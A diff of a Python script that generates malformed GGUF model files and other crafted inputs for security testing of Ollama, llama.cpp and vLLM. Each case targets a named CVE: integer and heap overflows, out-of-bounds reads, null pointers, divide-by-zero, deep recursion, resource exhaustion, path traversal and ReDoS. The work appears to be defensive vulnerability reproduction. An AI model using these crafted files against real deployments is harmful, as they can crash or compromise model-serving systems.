@@ -1,7 +1,13 @@
 #!/usr/bin/env python3
 """
 Generate ALL cross-framework test payloads.
-Covers patterns P1, P2, P5, P7, P8, P10, P11 from CROSS_FRAMEWORK_PATTERNS.md
+Covers 5 root cause categories:
+  Unsafe Model File Parsing  — Integer Overflow, Heap Overflow, Null Pointer
+  Untrusted Code Execution   — Unsafe Deserialization, Code Injection, SSTI (tested separately)
+  Resource Exhaustion / DoS  — ReDoS, Recursion, Resource Exhaustion
+  Insufficient Access Control — Path Traversal, SSRF, No Auth (tested separately)
+  Information Leakage        — timing/hash (tested separately)
+See CROSS_FRAMEWORK_PATTERNS.md for methodology.
 """
 
 import struct
@@ -47,11 +53,11 @@ def write_kv_float32(f, key, val):
 
 
 # ══════════════════════════════════════════════════════════════
-# P1: Integer Overflow / Narrow Casting (from Ollama LIMA-NEW-001/002)
+# Integer Overflow / Narrow Casting (from Ollama LIMA-NEW-001/002)
 # ══════════════════════════════════════════════════════════════
-print("=== P1: Integer Overflow / Narrow Casting ===")
+print("=== Integer Overflow / Narrow Casting ===")
 
-# P1a: KV key string length = 0x8000000000000000 → negative int
+# p1a: KV key string length = 0x8000000000000000 → negative int
 path = os.path.join(OUTDIR, "p1a_negative_key_length.gguf")
 with open(path, "wb") as f:
     f.write(GGUF_MAGIC)
@@ -63,7 +69,7 @@ with open(path, "wb") as f:
     f.write(b"A" * 16)
 print(f"  {path}")
 
-# P1b: KV array count = 0x8000000000000000 → negative make()
+# p1b: KV array count = 0x8000000000000000 → negative make()
 path = os.path.join(OUTDIR, "p1b_negative_array_count.gguf")
 with open(path, "wb") as f:
     f.write(GGUF_MAGIC)
@@ -77,7 +83,7 @@ with open(path, "wb") as f:
     f.write(b"\x00" * 16)
 print(f"  {path}")
 
-# P1c: KV string value length = 0x8000000000000000 (variant H from Ollama tests)
+# p1c: KV string value length = 0x8000000000000000 (variant H from Ollama tests)
 path = os.path.join(OUTDIR, "p1c_negative_value_length.gguf")
 with open(path, "wb") as f:
     f.write(GGUF_MAGIC)
@@ -91,11 +97,11 @@ with open(path, "wb") as f:
 print(f"  {path}")
 
 # ══════════════════════════════════════════════════════════════
-# P2: Heap Buffer Overflow in GGUF (from llama-cpp CVEs)
+# Heap Buffer Overflow in GGUF (from llama-cpp CVEs)
 # ══════════════════════════════════════════════════════════════
-print("\n=== P2: Heap Buffer Overflow (GGUF) ===")
+print("\n=== Heap Buffer Overflow (GGUF) ===")
 
-# P2a: Large n_kv → heap overflow in gguf_fread_str (CVE-2024-23605)
+# p2a: Large n_kv → heap overflow in gguf_fread_str (CVE-2024-23605)
 path = os.path.join(OUTDIR, "p2a_large_n_kv.gguf")
 with open(path, "wb") as f:
     f.write(GGUF_MAGIC)
@@ -105,7 +111,7 @@ with open(path, "wb") as f:
     f.write(b"\x00" * 64)
 print(f"  {path}")
 
-# P2b: Large n_tensors (CVE-2024-21836)
+# p2b: Large n_tensors (CVE-2024-21836)
 path = os.path.join(OUTDIR, "p2b_large_n_tensors.gguf")
 with open(path, "wb") as f:
     f.write(GGUF_MAGIC)
@@ -115,7 +121,7 @@ with open(path, "wb") as f:
     f.write(b"\x00" * 64)
 print(f"  {path}")
 
-# P2c: Small vocab → OOB read on special_bos_id (GHSA-g4cc-763q-h9h6)
+# p2c: Small vocab → OOB read on special_bos_id (GHSA-g4cc-763q-h9h6)
 # Requires a loadable GGUF with vocab_size=1 but special_bos_id=1
 path = os.path.join(OUTDIR, "p2c_small_vocab.gguf")
 with open(path, "wb") as f:
@@ -130,7 +136,7 @@ with open(path, "wb") as f:
     # vocab_size=1 but default bos_id=1 → OOB
 print(f"  {path}")
 
-# P2d: Large kv key length (CVE-2024-23496)
+# p2d: Large kv key length (CVE-2024-23496)
 path = os.path.join(OUTDIR, "p2d_large_key_length.gguf")
 with open(path, "wb") as f:
     f.write(GGUF_MAGIC)
@@ -143,11 +149,11 @@ with open(path, "wb") as f:
 print(f"  {path}")
 
 # ══════════════════════════════════════════════════════════════
-# P8: Recursion / Stack Overflow (from llama-cpp LIMA-NEW-003/004)
+# Recursion / Stack Overflow (from llama-cpp LIMA-NEW-003/004)
 # ══════════════════════════════════════════════════════════════
-print("\n=== P8: Recursion / Stack Overflow ===")
+print("\n=== Recursion / Stack Overflow ===")
 
-# P8a: Deeply nested GBNF grammar parentheses (LIMA-NEW-003)
+# p8a: Deeply nested GBNF grammar parentheses (LIMA-NEW-003)
 path = os.path.join(OUTDIR, "p8a_nested_parens.gbnf")
 depth = 50000
 grammar = 'root ::= ' + '(' * depth + '"a"' + ')' * depth
@@ -155,7 +161,7 @@ with open(path, "w") as f:
     f.write(grammar)
 print(f"  {path} ({depth} levels)")
 
-# P8b: Deeply nested JSON schema (LIMA-NEW-004)
+# p8b: Deeply nested JSON schema (LIMA-NEW-004)
 path = os.path.join(OUTDIR, "p8b_nested_schema.json")
 inner = '{"type":"integer"}'
 for _ in range(5000):
@@ -165,18 +171,18 @@ with open(path, "w") as f:
 print(f"  {path} (5000 levels)")
 
 # ══════════════════════════════════════════════════════════════
-# P10: Null Pointer / Truncated GGUF (from llama-cpp CVE-2024-41130)
+# Null Pointer / Truncated GGUF (from llama-cpp CVE-2024-41130)
 # ══════════════════════════════════════════════════════════════
-print("\n=== P10: Null Pointer / Truncated GGUF ===")
+print("\n=== Null Pointer / Truncated GGUF ===")
 
-# P10a: Truncated GGUF — just the magic + version (CVE-2024-39720 style)
+# p10a: Truncated GGUF — just the magic + version (CVE-2024-39720 style)
 path = os.path.join(OUTDIR, "p10a_truncated_magic.gguf")
 with open(path, "wb") as f:
     f.write(GGUF_MAGIC)
     f.write(struct.pack("<I", GGUF_VERSION))
 print(f"  {path}")
 
-# P10b: GGUF with tensor that has null name (CVE-2024-41130)
+# p10b: GGUF with tensor that has null name (CVE-2024-41130)
 path = os.path.join(OUTDIR, "p10b_null_tensor_name.gguf")
 with open(path, "wb") as f:
     f.write(GGUF_MAGIC)
@@ -193,7 +199,7 @@ with open(path, "wb") as f:
     f.write(struct.pack("<Q", 0))   # offset = 0
 print(f"  {path}")
 
-# P10c: GGUF header claims tensors but file ends abruptly
+# p10c: GGUF header claims tensors but file ends abruptly
 path = os.path.join(OUTDIR, "p10c_truncated_after_header.gguf")
 with open(path, "wb") as f:
     f.write(GGUF_MAGIC)
@@ -203,11 +209,11 @@ with open(path, "wb") as f:
 print(f"  {path}")
 
 # ══════════════════════════════════════════════════════════════
-# P11: Resource Exhaustion / No Limits (from Ollama CVEs)
+# Resource Exhaustion / No Limits (from Ollama CVEs)
 # ══════════════════════════════════════════════════════════════
-print("\n=== P11: Resource Exhaustion ===")
+print("\n=== Resource Exhaustion ===")
 
-# P11a: GGUF with alignment = 0 → divide by zero (CVE-2025-0317)
+# p11a: GGUF with alignment = 0 → divide by zero (CVE-2025-0317)
 path = os.path.join(OUTDIR, "p11a_zero_alignment.gguf")
 with open(path, "wb") as f:
     f.write(GGUF_MAGIC)
@@ -218,7 +224,7 @@ with open(path, "wb") as f:
     write_kv_uint32(f, "general.alignment", 0)  # alignment = 0 → div by zero
 print(f"  {path}")
 
-# P11b: GGUF with huge dimension (CVE-2025-0315)
+# p11b: GGUF with huge dimension (CVE-2025-0315)
 path = os.path.join(OUTDIR, "p11b_huge_dims.gguf")
 with open(path, "wb") as f:
     f.write(GGUF_MAGIC)
@@ -235,7 +241,7 @@ with open(path, "wb") as f:
     f.write(struct.pack("<Q", 0))   # offset
 print(f"  {path}")
 
-# P11c: GGUF with block_count = 0 → div by zero (CVE-2024-8063)
+# p11c: GGUF with block_count = 0 → div by zero (CVE-2024-8063)
 path = os.path.join(OUTDIR, "p11c_zero_block_count.gguf")
 with open(path, "wb") as f:
     f.write(GGUF_MAGIC)
@@ -249,7 +255,7 @@ with open(path, "wb") as f:
     write_kv_uint32(f, "llama.attention.head_count", 1)
 print(f"  {path}")
 
-# P11d: Extreme API parameters (JSON payloads, not GGUF)
+# p11d: Extreme API parameters (JSON payloads, not GGUF)
 path = os.path.join(OUTDIR, "p11d_extreme_api_params.json")
 params = {
     "model": "test",
@@ -264,9 +270,9 @@ with open(path, "w") as f:
 print(f"  {path}")
 
 # ══════════════════════════════════════════════════════════════
-# P5: Path Traversal (from Ollama CVEs)
+# Path Traversal (from Ollama CVEs)
 # ══════════════════════════════════════════════════════════════
-print("\n=== P5: Path Traversal ===")
+print("\n=== Path Traversal ===")
 
 path = os.path.join(OUTDIR, "p5_traversal_payloads.txt")
 payloads = [
@@ -283,9 +289,9 @@ with open(path, "w") as f:
 print(f"  {path}")
 
 # ══════════════════════════════════════════════════════════════
-# P7: ReDoS (from vLLM CVEs)
+# ReDoS (from vLLM CVEs)
 # ══════════════════════════════════════════════════════════════
-print("\n=== P7: ReDoS ===")
+print("\n=== ReDoS ===")
 
 # Crafted inputs that cause catastrophic backtracking in common regex patterns
 path = os.path.join(OUTDIR, "p7_redos_payloads.json")
